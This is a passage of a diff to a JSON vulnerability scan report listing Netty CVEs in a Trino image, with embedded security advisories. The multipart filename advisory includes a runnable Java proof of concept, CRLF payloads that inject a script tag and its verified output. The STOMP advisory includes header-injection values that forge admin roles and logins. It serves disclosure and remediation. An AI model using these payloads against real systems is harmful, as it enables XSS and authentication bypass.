+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59899",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:59052c6609b84da200af7fd430c302b1b4a76e284ea4c5b6a6e402cf3b0b155d",
+          "Title": "Netty: [HttpContentEncoder] Unbounded Per-Connection Queue Growth via HTTP/1.1 Pipelining Leads to Denial of Service",
+          "Description": "### Impact\n`HttpContentEncoder` (the superclass of the production handler `HttpContentCompressor`) maintains a per-channel `ArrayDeque\u003cCharSequence\u003e` named `acceptEncodingQueue` that accumulates attacker-controlled data without any size limit. The queue is filled on the I/O thread for every inbound HTTP request and drained only when the application later writes a non-1xx response. This creates a resource exhaustion vulnerability when an attacker exploits HTTP/1.1 pipelining to flood the connection with requests faster than the application produces responses.",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+              "V40Score": 6.9
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-q4f6-jm68-57ww"
+          ]
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59921",
+          "VendorIDs": [
+            "GHSA-gcjf-9mgh-3p7g"
+          ],
+          "PkgName": "io.netty:netty-codec-http",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-codec-http-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-codec-http@4.2.15.Final",
+            "UID": "7e33ae51dbfafc2d"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59921",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:c1cb28120d758aa9280f2d377dc4d0323d46a03635e229cd9cbb5a6a9791dad5",
+          "Title": "Netty: CRLF Injection via Multipart Filename in Netty HttpPostRequestEncoder",
+          "Description": "# Security Vulnerability Report: CRLF Injection via Multipart Filename in Netty HttpPostRequestEncoder\n\n## 1. Vulnerability Summary\n\n| Field | Value |\n|-------|-------|\n| **Product** | Netty |\n| **Version** | 4.2.12.Final (and all prior versions with codec-http multipart) |\n| **Component** | `io.netty.handler.codec.http.multipart.HttpPostRequestEncoder` |\n| **Vulnerability Type** | CWE-93: Improper Neutralization of CRLF Sequences / CWE-113: HTTP Response Splitting |\n| **Impact** | MIME Header Injection / Content-Type Spoofing / XSS via Content-Disposition |\n| **CVSS 3.1 Score** | **8.1 (High)** |\n| **CVSS 3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |\n| **Attack Vector** | Network |\n| **Attack Complexity** | Low |\n| **Privileges Required** | Low (attacker must be able to upload files with controlled filenames) |\n| **User Interaction** | None |\n| **Scope** | Unchanged |\n| **Confidentiality Impact** | High |\n| **Integrity Impact** | High |\n| **Availability Impact** | None |\n\n## 2. Affected Components\n\nThe following classes in the `codec-http` module are affected:\n\n- `io.netty.handler.codec.http.multipart.HttpPostRequestEncoder` — directly concatenates unvalidated filename/name into `Content-Disposition` MIME headers (lines 519, 633, 674, 682, 686-688)\n- `io.netty.handler.codec.http.multipart.DiskFileUpload` — `setFilename()` only checks null (line 78)\n- `io.netty.handler.codec.http.multipart.MemoryFileUpload` — `setFilename()` only checks null (line 60)\n- `io.netty.handler.codec.http.multipart.MixedFileUpload` — `setFilename()` delegates without validation (line 62)\n\n## 3. Vulnerability Description\n\nNetty's `HttpPostRequestEncoder` constructs multipart HTTP request bodies by directly concatenating user-supplied filenames and field names into `Content-Disposition` MIME headers **without validating or sanitizing CRLF characters** (`\\r\\n`). Since MIME headers are delimited by CRLF, an attacker who controls the filename can inject arbitrary MIME headers into the multipart body part.\n\n### Root Cause\n\nIn `HttpPostRequestEncoder.java`, multiple code paths directly embed `fileUpload.getFilename()` into header strings:\n\n```java\n// Line 674 (attachment mode):\ninternal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + \": \"\n    + HttpHeaderValues.ATTACHMENT + \"; \"\n    + HttpHeaderValues.FILENAME + \"=\\\"\" + fileUpload.getFilename() + \"\\\"\\r\\n\");\n//                                        ^^^^^^^^^^^^^^^^^^^^^^^^ NO VALIDATION\n\n// Lines 686-688 (form-data mode):\ninternal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + \": \" + HttpHeaderValues.FORM_DATA + \"; \"\n    + HttpHeaderValues.NAME + \"=\\\"\" + fileUpload.getName() + \"\\\"; \"\n    + HttpHeaderValues.FILENAME + \"=\\\"\" + fileUpload.getFilename() + \"\\\"\\r\\n\");\n//                                        ^^^^^^^^^^^^^^^^^^^^^^^^ NO VALIDATION\n\n// Line 519 (attribute name):\ninternal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + \": \" + HttpHeaderValues.FORM_DATA + \"; \"\n    + HttpHeaderValues.NAME + \"=\\\"\" + attribute.getName() + \"\\\"\\r\\n\");\n//                                    ^^^^^^^^^^^^^^^^^ NO VALIDATION\n```\n\nThe `setFilename()` method in all `FileUpload` implementations only checks for null:\n\n```java\n// DiskFileUpload.java:77-79\npublic void setFilename(String filename) {\n    this.filename = ObjectUtil.checkNotNull(filename, \"filename\");\n    // NO CRLF VALIDATION\n}\n```\n\n### Comparison with Similar Fixed CVEs\n\nThis vulnerability follows the same pattern as:\n\n| CVE | Component | Fix |\n|-----|-----------|-----|\n| **GHSA-jq43-27x9-3v86** | SmtpRequestEncoder — SMTP command injection | Added CRLF validation in `SmtpUtils.validateSMTPParameters()` |\n| **GHSA-84h7-rjj3-6jx4** | HttpRequestEncoder — CRLF in URI | Added `HttpUtil.validateRequestLineTokens()` |\n\nThe multipart encoder has **no equivalent validation** for filenames or field names.\n\n## 4. Exploitability Prerequisites\n\nThis vulnerability is exploitable when:\n\n1. The application uses Netty's `HttpPostRequestEncoder` to construct multipart HTTP requests\n2. The filename of an uploaded file is derived from user-controlled input\n3. The application does **not** perform its own CRLF sanitization on filenames\n\n**Common affected patterns**:\n- File upload proxies that forward user-supplied filenames\n- API gateways that construct multipart requests from incoming parameters\n- Microservice communication that passes filenames between services\n- Testing/automation frameworks that use Netty HTTP client with user-defined filenames\n\n## 5. Attack Scenarios\n\n### Scenario 1: Content-Type Override via Filename Injection\n\nAn attacker uploads a file with a crafted filename to override the Content-Type of the multipart body part, potentially enabling stored XSS:\n\n```java\nString maliciousFilename = \"photo.jpg\\\"\\r\\nContent-Type: text/html\\r\\n\\r\\n\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\\r\\n--\";\n\nDiskFileUpload upload = new DiskFileUpload(\n    \"avatar\", maliciousFilename, \"image/jpeg\", \"binary\", UTF_8, fileSize);\n```\n\n**Wire format:**\n```\n--boundary\ncontent-disposition: form-data; name=\"avatar\"; filename=\"photo.jpg\"\nContent-Type: text/html                    \u003c-- INJECTED: overrides image/jpeg\n\n\u003cscript\u003ealert(document.cookie)\u003c/script\u003e    \u003c-- INJECTED: XSS payload\n--\"\ncontent-type: image/jpeg                   \u003c-- Original (now ignored by many parsers)\n...\n```\n\nIf the receiving server parses the **first** `Content-Type`, the file is treated as HTML instead of JPEG, enabling XSS when the file is served back.\n\n### Scenario 2: Arbitrary MIME Header Injection\n\n```java\nString filename = \"doc.pdf\\\"\\r\\nX-Custom-Auth: admin-token-12345\\r\\nX-Bypass-Check: true\";\n```\n\nInjects arbitrary headers into the multipart body part that may be processed by downstream middleware or application logic.\n\n### Scenario 3: Multipart Boundary Confusion\n\n```java\nString filename = \"file.txt\\\"\\r\\n\\r\\nmalicious body content\\r\\n--boundary\\r\\nContent-Disposition: form-data; name=\\\"secret\";\n```\n\nBy injecting a new boundary delimiter, the attacker can:\n- Terminate the current body part prematurely\n- Start a new body part with a different field name\n- Override form fields processed by the server\n\n## 6. Proof of Concept\n\n### Full Runnable PoC Source Code (MultipartFilenameInjectionPoC.java)\n\n```java\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.multipart.*;\n\nimport java.io.File;\nimport java.io.FileWriter;\nimport java.nio.charset.StandardCharsets;\n\n/**\n * PoC: HTTP Multipart Content-Disposition Header Injection via Filename\n *\n * Demonstrates that HttpPostRequestEncoder does not validate filenames\n * for CRLF characters, allowing injection of arbitrary MIME headers\n * into multipart form data.\n */\npublic class MultipartFilenameInjectionPoC {\n\n    public static void main(String[] args) throws Exception {\n        System.out.println(\"=== Netty Multipart Filename CRLF Injection PoC ===\\n\");\n\n        testFilenameInjection();\n\n        System.out.println(\"\\n=== PoC Complete ===\");\n    }\n\n    static void testFilenameInjection() throws Exception {\n        System.out.println(\"[TEST 1] Filename CRLF Injection in Content-Disposition\");\n        System.out.println(\"-------------------------------------------------------\");\n\n        // Create a temporary file for upload\n        File tempFile = File.createTempFile(\"test\", \".txt\");\n        tempFile.deleteOnExit();\n        try (FileWriter fw = new FileWriter(tempFile)) {\n            fw.write(\"test content\");\n        }\n\n        // Malicious filename with CRLF to inject Content-Type header\n        String maliciousFilename =\n            \"innocent.txt\\\"\\r\\nContent-Type: text/html\\r\\nX-Injected: true\\r\\n\\r\\n\" +\n            \"\u003cscript\u003ealert(1)\u003c/script\u003e\\r\\n--\";\n\n        HttpRequest request = new DefaultHttpRequest(\n            HttpVersion.HTTP_1_1, HttpMethod.POST, \"/upload\");\n\n        HttpPostRequestEncoder encoder = new HttpPostRequestEncoder(\n                new DefaultHttpDataFactory(false), request, true,\n                StandardCharsets.UTF_8, HttpPostRequestEncoder.EncoderMode.RFC3986);\n\n        DiskFileUpload fileUpload = new DiskFileUpload(\n                \"file\", maliciousFilename, \"application/octet-stream\",\n                \"binary\", StandardCharsets.UTF_8, tempFile.length());\n        fileUpload.setContent(tempFile);\n\n        encoder.addBodyHttpData(fileUpload);\n        encoder.finalizeRequest();\n\n        // Read the encoded multipart body\n        StringBuilder body = new StringBuilder();\n        while (!encoder.isEndOfInput()) {\n            HttpContent chunk = encoder.readChunk(Unpooled.buffer().alloc());\n            if (chunk != null) {\n                body.append(chunk.content().toString(StandardCharsets.UTF_8));\n                chunk.release();\n            }\n        }\n        encoder.cleanFiles();\n\n        String encoded = body.toString();\n        System.out.println(\"Malicious filename: \" +\n            maliciousFilename.replace(\"\\r\", \"\\\\r\").replace(\"\\n\", \"\\\\n\"));\n        System.out.println();\n        System.out.println(\"Encoded multipart body:\");\n        System.out.println(\"---\");\n        for (String line : encoded.split(\"\\n\", -1)) {\n            System.out.println(\"  \" + line.replace(\"\\r\", \"\\\\r\"));\n        }\n        System.out.println(\"---\");\n\n        boolean hasInjectedHeader = encoded.contains(\"X-Injected: true\");\n        boolean hasInjectedScript = encoded.contains(\"\u003cscript\u003e\");\n        System.out.println();\n        System.out.println(\"Injected X-Injected header: \" + hasInjectedHeader);\n        System.out.println(\"Injected script tag: \" + hasInjectedScript);\n        System.out.println(\"VULNERABLE: \" +\n            ((hasInjectedHeader || hasInjectedScript) ?\n                \"YES - MIME header injection!\" : \"NO\"));\n\n        tempFile.delete();\n    }\n}\n```\n\n### How to Compile and Run\n\n```bash\n# Build Netty (skip tests)\n./mvnw install -pl common,buffer,codec,codec-base,codec-http,transport -DskipTests \\\n  -Dcheckstyle.skip=true -Denforcer.skip=true -Djapicmp.skip=true \\\n  -Danimal.sniffer.skip=true -Drevapi.skip=true -Dforbiddenapis.skip=true \\\n  -Dspotbugs.skip=true -q\n\n# Set classpath\nJARS=$(find ~/.m2/repository/io/netty -name \"netty-*.jar\" -path \"*/4.2.12.Final/*\" \\\n  | grep -v sources | grep -v javadoc | tr '\\n' ':')\n\n# Compile and run\njavac -cp \"$JARS\" MultipartFilenameInjectionPoC.java\njava -cp \"$JARS:.\" MultipartFilenameInjectionPoC\n```\n\n### PoC Execution Output (Verified on Netty 4.2.12.Final)\n\n```\n=== Netty Multipart Filename CRLF Injection PoC ===\n\n[TEST 1] Filename CRLF Injection in Content-Disposition\n-------------------------------------------------------\nMalicious filename: innocent.txt\"\\r\\nContent-Type: text/html\\r\\nX-Injected: true\\r\\n\\r\\n\u003cscript\u003ealert(1)\u003c/script\u003e\\r\\n--\n\nEncoded multipart body:\n---\n  --88aaade41dbb9f9f\\r\n  content-disposition: form-data; name=\"file\"; filename=\"innocent.txt\"\\r\n  Content-Type: text/html\\r                          \u003c-- INJECTED\n  X-Injected: true\\r                                 \u003c-- INJECTED\n  \\r\n  \u003cscript\u003ealert(1)\u003c/script\u003e\\r                        \u003c-- INJECTED XSS\n  --\"\\r\n  content-length: 12\\r\n  content-type: application/octet-stream\\r\n  content-transfer-encoding: binary\\r\n  \\r\n  test content\\r\n  --88aaade41dbb9f9f--\\r\n---\n\nInjected X-Injected header: true\nInjected script tag: true\nVULNERABLE: YES - MIME header injection!\n\n\n=== PoC Complete ===\n```\n\n## 7. Impact Analysis\n\n| Impact Category | Description |\n|----------------|-------------|\n| **Confidentiality** | HIGH — Injected headers may bypass access controls or leak tokens |\n| **Integrity** | HIGH — Content-Type override enables stored XSS; field name injection allows form data manipulation |\n| **Content-Type Spoofing** | Override `application/octet-stream` to `text/html` to serve executable content |\n| **Stored XSS** | Inject `\u003cscript\u003e` tags via Content-Type override when uploaded files are served back |\n| **Form Field Override** | Inject new multipart boundaries to create/override form fields |\n| **Downstream Injection** | Custom MIME headers may affect middleware, CDN, or storage layer behavior |\n\n## 8. Remediation Recommendations\n\n### Option 1: Validate in FileUpload.setFilename() (Recommended)\n\n```java\n// DiskFileUpload.java / MemoryFileUpload.java / MixedFileUpload.java\npublic void setFilename(String filename) {\n    ObjectUtil.checkNotNull(filename, \"filename\");\n    for (int i = 0; i \u003c filename.length(); i++) {\n        char c = filename.charAt(i);\n        if (c == '\\r' || c == '\\n') {\n            throw new IllegalArgumentException(\n                \"filename contains prohibited CRLF character at index \" + i);\n        }\n    }\n    this.filename = filename;\n}\n```\n\n### Option 2: Sanitize in HttpPostRequestEncoder (Defense-in-Depth)\n\nEscape or reject CRLF characters when building Content-Disposition headers:\n\n```java\n// HttpPostRequestEncoder.java - add helper method\nprivate static String sanitizeHeaderParam(String value) {\n    for (int i = 0; i \u003c value.length(); i++) {\n        char c = value.charAt(i);\n        if (c == '\\r' || c == '\\n' || c == '\"') {\n            throw new ErrorDataEncoderException(\n                \"Multipart parameter contains prohibited character at index \" + i);\n        }\n    }\n    return value;\n}\n\n// Then use in Content-Disposition construction:\ninternal.addValue(... + \"=\\\"\" + sanitizeHeaderParam(fileUpload.getFilename()) + \"\\\"\\r\\n\");\n```\n\n### Option 3: RFC 2231/5987 Encoding for Filenames\n\nUse proper RFC 2231 encoding for filenames with special characters:\n\n```java\n// Encode filename per RFC 5987:\n// filename*=UTF-8''encoded%20filename\nString encodedFilename = \"UTF-8''\" + URLEncoder.encode(filename, \"UTF-8\");\ninternal.addValue(... + \"filename*=\" + encodedFilename + \"\\r\\n\");\n```\n\n## 9. References\n\n- [RFC 2183: Content-Disposition Header Field](https://tools.ietf.org/html/rfc2183)\n- [RFC 7578: Returning Values from Forms: multipart/form-data](https://tools.ietf.org/html/rfc7578)\n- [RFC 5987: Character Set and Language Encoding for HTTP Header Field Parameters](https://tools.ietf.org/html/rfc5987)\n- [CWE-93: Improper Neutralization of CRLF Sequences](https://cwe.mitre.org/data/definitions/93.html)\n- [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers](https://cwe.mitre.org/data/definitions/113.html)\n- [GHSA-jq43-27x9-3v86: Netty SMTP Command Injection (same pattern)](https://github.com/netty/netty/security/advisories/GHSA-jq43-27x9-3v86)\n- [GHSA-84h7-rjj3-6jx4: Netty HTTP CRLF Injection (same pattern)](https://github.com/netty/netty/security/advisories/GHSA-84h7-rjj3-6jx4)",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 5.7
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-gcjf-9mgh-3p7g"
+          ]
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59900",
+          "VendorIDs": [
+            "GHSA-c69g-56f8-xwqj"
+          ],
+          "PkgName": "io.netty:netty-codec-http2",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-codec-http2-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-codec-http2@4.2.15.Final",
+            "UID": "dead7f3398297d64"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59900",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:20969ad4fffd79cd886cbab17328d1b8dff0e45a23b51a7a5479447381a19862",
+          "Title": "Netty: [codec-http2] Lack of Host Header Deduplication in HTTP/2→HTTP/1.x Translation Leads to Request Routing Bypass",
+          "Description": "Netty's HTTP/2-to-HTTP/1.x translation layer (`Http2StreamFrameToHttpObjectCodec` and `InboundHttp2ToHttpAdapter`) fails to deduplicate or validate `Host` headers when an HTTP/2 client supplies both the `:authority` pseudo-header and a literal `host` header in a single HEADERS frame. The translator maps `:authority` to `Host` and separately copies the literal `host` header, producing an `HttpRequest` object containing two `Host` headers with attacker-controlled differing values.",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N",
+              "V40Score": 6.9
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-c69g-56f8-xwqj"
+          ]
+        },
+        {
+          "VulnerabilityID": "CVE-2026-56816",
+          "VendorIDs": [
+            "GHSA-hpcc-26xq-25fv"
+          ],
+          "PkgName": "io.netty:netty-codec-http3",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-codec-http3-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-codec-http3@4.2.15.Final",
+            "UID": "1fbf89a3dc0248a9"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-56816",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:a8b10f8192141187f8815a9cbd60a3c9526dafce17f41b47ddb9518c187291df",
+          "Title": "Netty: Memory Exhaustion via HTTP/3 Reserved Frame Types",
+          "Description": "Netty is a network application framework for development of protocol servers and clients. Prior to 4.2.16.Final, Netty's `Http3FrameCodec` buffers incoming data for HTTP/3 reserved frame types up to the wire-specified payload length without limits; `decodeFrame` trusts `payLoadLength`, allowing an attacker to open multiple QUIC streams and send reserved frames with very large payload lengths to cause memory exhaustion and denial of service. This issue is fixed in version 4.2.16.Final.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-400"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655c9003b",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-hpcc-26xq-25fv",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-56816"
+          ],
+          "PublishedDate": "2026-07-21T22:17:14.803Z",
+          "LastModifiedDate": "2026-07-22T20:35:40.827Z"
+        },
+        {
           "VulnerabilityID": "CVE-2026-44891",
           "VendorIDs": [
             "GHSA-vhch-2wf3-m8rp"
@@ -39088,7 +39673,248 @@
             "https://github.com/netty/netty/security/advisories/GHSA-vhch-2wf3-m8rp"
           ],
           "PublishedDate": "2026-07-17T21:17:06.25Z",
-          "LastModifiedDate": "2026-07-21T20:25:45.92Z"
+          "LastModifiedDate": "2026-07-22T19:38:23.437Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59920",
+          "VendorIDs": [
+            "GHSA-3g8r-4pfx-jmfh"
+          ],
+          "PkgName": "io.netty:netty-codec-stomp",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-codec-stomp-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-codec-stomp@4.2.15.Final",
+            "UID": "e970558db937e69f"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59920",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:c915b93b4125306b3bbed5a1c6e2ec26787bd20d2e6168125bf91a8500d397e1",
+          "Title": "Netty: STOMP CONNECT Frame Header Injection in Netty",
+          "Description": "# Security Vulnerability Report: STOMP CONNECT Frame Header Injection in Netty\n\n## 1. Vulnerability Summary\n\n| Field | Value |\n|-------|-------|\n| **Product** | Netty |\n| **Version** | 4.2.12.Final (and all prior versions with codec-stomp) |\n| **Component** | `io.netty.handler.codec.stomp.StompSubframeEncoder` |\n| **Vulnerability Type** | CWE-93: Improper Neutralization of CRLF Sequences / CWE-113: Improper Neutralization of CRLF in HTTP Headers |\n| **Impact** | STOMP Header Injection / Authentication Bypass |\n| **CVSS 3.1 Score** | **6.5 (Medium)** |\n| **CVSS 3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` |\n| **Attack Vector** | Network |\n| **Attack Complexity** | Low |\n| **Privileges Required** | Low |\n| **User Interaction** | None |\n| **Scope** | Unchanged |\n| **Confidentiality Impact** | None |\n| **Integrity Impact** | High |\n| **Availability Impact** | None |\n\n## 2. Affected Components\n\n- `io.netty.handler.codec.stomp.StompSubframeEncoder` — `encodeHeaders()` method (lines 174-200)\n- `io.netty.handler.codec.stomp.StompSubframeEncoder` — `shouldEscape()` method (lines 214-216)\n\n## 3. Vulnerability Description\n\nThe Netty STOMP codec encoder (`StompSubframeEncoder`) intentionally skips the `escape()` function for `CONNECT` and `CONNECTED` commands. This means that newline characters (`\\n`) in header values of CONNECT frames are written directly to the output, allowing an attacker to inject additional STOMP headers.\n\n### Root Cause\n\nIn `StompSubframeEncoder.java`, the `shouldEscape()` method (lines 214-216) explicitly excludes CONNECT and CONNECTED commands from escaping:\n\n```java\nprivate static boolean shouldEscape(StompCommand command) {\n    return command != StompCommand.CONNECT \u0026\u0026 command != StompCommand.CONNECTED;\n}\n```\n\nWhen `shouldEscape()` returns `false`, header values are written without any escaping (line 195):\n\n```java\nCharSequence headerValue = shouldEscape ? escape(entry.getValue()) : entry.getValue();\nByteBufUtil.writeUtf8(buf, headerValue);  // Raw \\n written to output\nbuf.writeByte(StompConstants.LF);\n```\n\nFor other commands (SEND, SUBSCRIBE, etc.), the `escape()` method (lines 218-240) correctly converts `\\n` to `\\\\n`, `\\r` to `\\\\r`, `:` to `\\\\c`, and `\\\\` to `\\\\\\\\`.\n\n### STOMP Specification Context and Security Analysis\n\nThe STOMP 1.2 specification (Section 10, Value Encoding) states that CONNECT and CONNECTED frames should **not use escaping**, to maintain backwards compatibility with STOMP 1.0 clients that do not understand escape sequences.\n\n**However, \"no escaping\" does not mean \"no validation\".** The specification's intent is that CONNECT headers should not use the `\\n` → `\\\\n` escape notation. It does **not** mandate that implementations must accept raw newline characters within header values. There is a critical distinction:\n\n- **Escaping** = converting `\\n` to `\\\\n` in the wire format (spec says: don't do this for CONNECT)\n- **Validation** = rejecting header values that contain `\\n` (spec does not prohibit this)\n\nNetty's implementation conflates these two concepts: by skipping `escape()`, it also skips **all** protection against newline injection. The correct behavior would be to skip escaping but still **reject** values containing raw newline characters, since such values are inherently malformed — no legitimate STOMP 1.0 or 1.2 header value should contain a raw `\\n`.\n\nThis is analogous to Netty's own SMTP fix (GHSA-jq43-27x9-3v86): SMTP parameters don't need escaping either, but Netty added validation to reject CRLF in parameters. The same principle should apply here.\n\n**Additionally**, Netty's own test suite explicitly validates this non-escaping behavior in `StompSubframeEncoderTest.java:126-143` (`testNotEscapeStompHeadersForConnectCommand`), confirming that this is a deliberate design choice — but the test only verifies that escaping is skipped, not that injection is possible. The security implications were not considered.\n\n**Summary**: The vulnerability exists because:\n\n1. Header values in CONNECT frames are **neither escaped nor validated** for newlines\n2. A raw newline in a header value creates a **new header line** on the wire\n3. The STOMP broker parses each line as a separate header\n4. The fix should **validate** (reject `\\n`) rather than **escape** (convert `\\n` to `\\\\n`), maintaining spec compliance\n\n## 4. Exploitability Prerequisites\n\nThis vulnerability is exploitable when **all** of the following conditions are met:\n\n1. The application uses Netty's `codec-stomp` module to encode STOMP frames\n2. User-controlled input is placed into header values of a `CONNECT` or `CONNECTED` frame\n3. The application does **not** perform its own newline sanitization\n4. The downstream STOMP broker processes the injected headers (broker-dependent)\n\n**Typical affected use cases**:\n- STOMP proxy/gateway applications that forward or construct CONNECT frames with user-supplied credentials\n- Web-to-STOMP bridge applications (e.g., WebSocket-STOMP proxies) where login/passcode come from web forms\n- Multi-tenant STOMP platforms where tenant-specific headers are injected into CONNECT frames\n\n## 5. Attack Scenarios\n\n### Scenario 1: Authentication Bypass via Header Injection\n\nAn attacker who can control any header value in a CONNECT frame can inject additional authentication-related headers:\n\n```java\nDefaultStompFrame frame = new DefaultStompFrame(StompCommand.CONNECT);\nframe.headers().set(StompHeaders.HOST, \"localhost\");\nframe.headers().set(StompHeaders.LOGIN, \"guest\");\n// Attacker injects a role header via \\n in passcode\nframe.headers().set(StompHeaders.PASSCODE, \"password\\nadmin-role:true\");\n```\n\n**Wire format sent to broker:**\n```\nCONNECT\nhost:localhost\nlogin:guest\npasscode:password\nadmin-role:true        \u003c-- INJECTED HEADER\n                       \u003c-- Empty line (end of headers)\n\\0\n```\n\nThe broker receives 5 headers instead of the intended 4. If the broker checks for an `admin-role` header to grant elevated privileges, the attacker bypasses authentication.\n\n### Scenario 2: Subscription Hijacking\n\n```java\nframe.headers().set(StompHeaders.PASSCODE, \"pass\\nhost:evil-broker.com\");\n```\n\nThis overwrites the `host` header, potentially redirecting the connection to an attacker-controlled STOMP broker (depending on broker implementation).\n\n### Scenario 3: Header Overwrite\n\n```java\nframe.headers().set(StompHeaders.LOGIN, \"user\\nlogin:admin\");\n```\n\n**Wire format:**\n```\nCONNECT\nlogin:user\nlogin:admin            \u003c-- INJECTED, may override first\n...\n```\n\nSome brokers use the last value when duplicate headers exist, allowing the attacker to escalate to the `admin` account.\n\n## 6. Proof of Concept\n\n### Full Runnable PoC Source Code (StompConnectHeaderInjectionPoC.java)\n\n```java\nimport 